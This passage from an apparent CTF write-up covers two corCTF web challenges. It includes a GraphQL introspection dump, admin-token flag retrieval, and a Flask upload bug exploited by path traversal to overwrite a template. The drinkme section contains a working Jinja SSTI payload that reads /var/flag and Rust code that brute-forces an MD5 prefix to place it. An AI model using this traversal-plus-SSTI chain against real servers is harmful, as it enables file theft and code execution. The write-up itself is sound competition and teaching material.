                            "name": "interfaces",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "LIST",
                                "name": null,
                                "ofType": {
                                    "kind": "NON_NULL",
                                    "name": null,
                                    "ofType": {
                                        "kind": "OBJECT",
                                        "name": "__Type",
                                        "ofType": null
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "possibleTypes",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "LIST",
                                "name": null,
                                "ofType": {
                                    "kind": "NON_NULL",
                                    "name": null,
                                    "ofType": {
                                        "kind": "OBJECT",
                                        "name": "__Type",
                                        "ofType": null
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "enumValues",
                            "description": null,
                            "args": [
                                {
                                    "name": "includeDeprecated",
                                    "description": null,
                                    "type": {
                                        "kind": "SCALAR",
                                        "name": "Boolean",
                                        "ofType": null
                                    },
                                    "defaultValue": "false"
                                }
                            ],
                            "type": {
                                "kind": "LIST",
                                "name": null,
                                "ofType": {
                                    "kind": "NON_NULL",
                                    "name": null,
                                    "ofType": {
                                        "kind": "OBJECT",
                                        "name": "__EnumValue",
                                        "ofType": null
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "inputFields",
                            "description": null,
                            "args": [
                                {
                                    "name": "includeDeprecated",
                                    "description": null,
                                    "type": {
                                        "kind": "SCALAR",
                                        "name": "Boolean",
                                        "ofType": null
                                    },
                                    "defaultValue": "false"
                                }
                            ],
                            "type": {
                                "kind": "LIST",
                                "name": null,
                                "ofType": {
                                    "kind": "NON_NULL",
                                    "name": null,
                                    "ofType": {
                                        "kind": "OBJECT",
                                        "name": "__InputValue",
                                        "ofType": null
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "ofType",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "OBJECT",
                                "name": "__Type",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "ENUM",
                    "name": "__TypeKind",
                    "description": "An enum describing what kind of type a given `__Type` is.",
                    "fields": null,
                    "inputFields": null,
                    "interfaces": null,
                    "enumValues": [
                        {
                            "name": "SCALAR",
                            "description": "Indicates this type is a scalar.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "OBJECT",
                            "description": "Indicates this type is an object. `fields` and `interfaces` are valid fields.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "INTERFACE",
                            "description": "Indicates this type is an interface. `fields`, `interfaces`, and `possibleTypes` are valid fields.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "UNION",
                            "description": "Indicates this type is a union. `possibleTypes` is a valid field.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "ENUM",
                            "description": "Indicates this type is an enum. `enumValues` is a valid field.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "INPUT_OBJECT",
                            "description": "Indicates this type is an input object. `inputFields` is a valid field.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "LIST",
                            "description": "Indicates this type is a list. `ofType` is a valid field.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "NON_NULL",
                            "description": "Indicates this type is a non-null. `ofType` is a valid field.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "possibleTypes": null
                },
                {
                    "kind": "OBJECT",
                    "name": "__Field",
                    "description": "Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type.",
                    "fields": [
                        {
                            "name": "name",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "String",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "description",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "args",
                            "description": null,
                            "args": [
                                {
                                    "name": "includeDeprecated",
                                    "description": null,
                                    "type": {
                                        "kind": "SCALAR",
                                        "name": "Boolean",
                                        "ofType": null
                                    },
                                    "defaultValue": "false"
                                }
                            ],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "LIST",
                                    "name": null,
                                    "ofType": {
                                        "kind": "NON_NULL",
                                        "name": null,
                                        "ofType": {
                                            "kind": "OBJECT",
                                            "name": "__InputValue",
                                            "ofType": null
                                        }
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "type",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "OBJECT",
                                    "name": "__Type",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "isDeprecated",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "Boolean",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "deprecationReason",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "OBJECT",
                    "name": "__InputValue",
                    "description": "Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value.",
                    "fields": [
                        {
                            "name": "name",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "String",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "description",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "type",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "OBJECT",
                                    "name": "__Type",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "defaultValue",
                            "description": "A GraphQL-formatted string representing the default value for this input value.",
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "isDeprecated",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "Boolean",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "deprecationReason",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "OBJECT",
                    "name": "__EnumValue",
                    "description": "One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string.",
                    "fields": [
                        {
                            "name": "name",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "String",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "description",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "isDeprecated",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "Boolean",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "deprecationReason",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "OBJECT",
                    "name": "__Directive",
                    "description": "A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\n\nIn some cases, you need to provide options to alter GraphQL's execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor.",
                    "fields": [
                        {
                            "name": "name",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "String",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "description",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "isRepeatable",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "Boolean",
                                    "ofType": null
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "locations",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "LIST",
                                    "name": null,
                                    "ofType": {
                                        "kind": "NON_NULL",
                                        "name": null,
                                        "ofType": {
                                            "kind": "ENUM",
                                            "name": "__DirectiveLocation",
                                            "ofType": null
                                        }
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "args",
                            "description": null,
                            "args": [],
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "LIST",
                                    "name": null,
                                    "ofType": {
                                        "kind": "NON_NULL",
                                        "name": null,
                                        "ofType": {
                                            "kind": "OBJECT",
                                            "name": "__InputValue",
                                            "ofType": null
                                        }
                                    }
                                }
                            },
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "inputFields": null,
                    "interfaces": [],
                    "enumValues": null,
                    "possibleTypes": null
                },
                {
                    "kind": "ENUM",
                    "name": "__DirectiveLocation",
                    "description": "A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies.",
                    "fields": null,
                    "inputFields": null,
                    "interfaces": null,
                    "enumValues": [
                        {
                            "name": "QUERY",
                            "description": "Location adjacent to a query operation.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "MUTATION",
                            "description": "Location adjacent to a mutation operation.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "SUBSCRIPTION",
                            "description": "Location adjacent to a subscription operation.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "FIELD",
                            "description": "Location adjacent to a field.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "FRAGMENT_DEFINITION",
                            "description": "Location adjacent to a fragment definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "FRAGMENT_SPREAD",
                            "description": "Location adjacent to a fragment spread.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "INLINE_FRAGMENT",
                            "description": "Location adjacent to an inline fragment.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "VARIABLE_DEFINITION",
                            "description": "Location adjacent to a variable definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "SCHEMA",
                            "description": "Location adjacent to a schema definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "SCALAR",
                            "description": "Location adjacent to a scalar definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "OBJECT",
                            "description": "Location adjacent to an object type definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "FIELD_DEFINITION",
                            "description": "Location adjacent to a field definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "ARGUMENT_DEFINITION",
                            "description": "Location adjacent to an argument definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "INTERFACE",
                            "description": "Location adjacent to an interface definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "UNION",
                            "description": "Location adjacent to a union definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "ENUM",
                            "description": "Location adjacent to an enum definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "ENUM_VALUE",
                            "description": "Location adjacent to an enum value definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "INPUT_OBJECT",
                            "description": "Location adjacent to an input object type definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        },
                        {
                            "name": "INPUT_FIELD_DEFINITION",
                            "description": "Location adjacent to an input object field definition.",
                            "isDeprecated": false,
                            "deprecationReason": null
                        }
                    ],
                    "possibleTypes": null
                }
            ],
            "directives": [
                {
                    "name": "include",
                    "description": "Directs the executor to include this field or fragment only when the `if` argument is true.",
                    "locations": [
                        "FIELD",
                        "FRAGMENT_SPREAD",
                        "INLINE_FRAGMENT"
                    ],
                    "args": [
                        {
                            "name": "if",
                            "description": "Included when true.",
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "Boolean",
                                    "ofType": null
                                }
                            },
                            "defaultValue": null
                        }
                    ]
                },
                {
                    "name": "skip",
                    "description": "Directs the executor to skip this field or fragment when the `if` argument is true.",
                    "locations": [
                        "FIELD",
                        "FRAGMENT_SPREAD",
                        "INLINE_FRAGMENT"
                    ],
                    "args": [
                        {
                            "name": "if",
                            "description": "Skipped when true.",
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "Boolean",
                                    "ofType": null
                                }
                            },
                            "defaultValue": null
                        }
                    ]
                },
                {
                    "name": "deprecated",
                    "description": "Marks an element of a GraphQL schema as no longer supported.",
                    "locations": [
                        "FIELD_DEFINITION",
                        "ARGUMENT_DEFINITION",
                        "INPUT_FIELD_DEFINITION",
                        "ENUM_VALUE"
                    ],
                    "args": [
                        {
                            "name": "reason",
                            "description": "Explains why this element was deprecated, usually also including a suggestion for how to access supported similar data. Formatted using the Markdown syntax, as specified by [CommonMark](https://commonmark.org/).",
                            "type": {
                                "kind": "SCALAR",
                                "name": "String",
                                "ofType": null
                            },
                            "defaultValue": "\"No longer supported\""
                        }
                    ]
                },
                {
                    "name": "specifiedBy",
                    "description": "Exposes a URL that specifies the behaviour of this scalar.",
                    "locations": [
                        "SCALAR"
                    ],
                    "args": [
                        {
                            "name": "url",
                            "description": "The URL that specifies the behaviour of this scalar.",
                            "type": {
                                "kind": "NON_NULL",
                                "name": null,
                                "ofType": {
                                    "kind": "SCALAR",
                                    "name": "String",
                                    "ofType": null
                                }
                            },
                            "defaultValue": null
                        }
                    ]
                }
            ]
        }
    }
}
</code>
</pre>
</details>

I'm not super familiar with graphql, but in my mind the nondefault queries roughly translated as a table users of User(username: String, token: String) and a function flag(token: String). Listing the users table showed an enormous number of what looked like hashes and an "admin" user at the top. Through trial and error I determined that the user tokens didn't get the flag, but the admin token would. The flag is corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}

# drinkme

```text
Are you thirsty? Why don't you try some of our drinks at our new store, drinkme! Leave a message on the wall too when you're done.

NOTE: Flag is at /var/flag

NOTE: This challenge uses per-team instances. Please test locally and don't launch one until you have a working exploit.

NOTE: The drinkme instancer takes a bit of time (< 1 min) to start the container, please be patient.

https://drinkme.be.ax
```

We get all source again and I'm just including the server file for brevity. 

### app.py
```python
#!/usr/bin/env python3
from flask import Flask, flash, request, redirect, url_for, render_template, send_from_directory
import os
import hashlib
app = Flask(__name__)
app.secret_key = b'537472656c6c6963206973206d79206661766f72697465206d656d626572206f6620436f52' # Don't bother trying to exploit - this is just to get flash() to work because I'm too lazy to make proper error messages

# stuff for per-team instances, can probably ignore this line
if os.getenv('PORT') is not None:
    app.config['SERVER_NAME'] = f"{os.getenv('PORT')}.drinkme.be.ax"

@app.route('/')
@app.route('/index')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'file' not in request.files:
        flash('You, uh, kinda need a file.')
        return redirect(url_for('index'))
    if 'type' not in request.form:
        flash('Please specify a filetype.')
        return redirect(url_for('index'))
    file = request.files['file']
    UPLOAD_FOLDER = './wall/' + request.form['type']
    if file.filename == '':
        flash('You uh, kinda need a file.')
        return redirect(url_for('index'))
    if file:
        filename = hashlib.md5(file.read()).hexdigest()[:5] + '.' + '.'.join(file.filename.split('.')[1:])
        file.seek(0)
        try:
            file.save(os.path.join(UPLOAD_FOLDER, filename))
            flash('File successfully uploaded!')
            return redirect(url_for('index'))
        except:
            flash('Error while uploading file.')
            return redirect(url_for('index'))
    
@app.route('/wall')
def wall():
    return render_template('guest_wall.html', images=os.listdir("wall/image"), text=os.listdir("wall/text"), videos=os.listdir("wall/video")) # Is this bad coding? Yes. Do I care? No.

@app.route('/wall/<path:path>') # I don't even use flask so this is probably implemented completely wrong pls dont flame me
def return_file(path):
    return send_from_directory("wall", path)
    

@app.route('/americano')
def beef():
    return render_template('americano.html')

@app.route('/cappuccino')
def pork():
    return render_template('cappuccino.html')

@app.route('/decaf')
def mutton():
    return render_template('decaf.html')

if __name__ == '__main__':
    app.run(host = '0.0.0.0', port = 5000, debug=True)
```

So the first thing I noticed was that it was concatenating unchecked input for the upload path and that's gross. By forging a type to include .., we can make it upload our file anywhere we want. I immediately went to "overwrite server files" and was disappointed because we don't control the filename; It's derived from the first five characters of the file md5 hash + "." + file extension. I was looking at the templates: americano.html, cappuccino.html, and *decaf.html* when it clicked. "decaf" is valid hexadecimal characters which means if we upload an html file that hashes to "decaf\*" it will upload decaf.html. I did the only reasonable thing -- make an SSTI payload to read /var/flag and then brute forced for padding which hashed to that. 

```rust
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;

fn main() {
    let base = "{{  self._TemplateReference__context.cycler.__init__.__globals__.__builtins__.open('/var/flag','r').read() }}";
    let (found, _) = std::iter::repeat(()).map(|_| {
        let mut attempt = base.to_string();
        for i in thread_rng().sample_iter(&Alphanumeric)
            .take(100) {
            attempt.push(i as char);
        }
        let digest = md5::compute(&attempt);
        (attempt, format!("{:x}", digest)[..5].to_string())
    }).find(|(_,x)| x == "decaf").unwrap();
    println!("{}", found);
}
```

I didn't save the flag so I'll grab it from some other writeup and update this later. 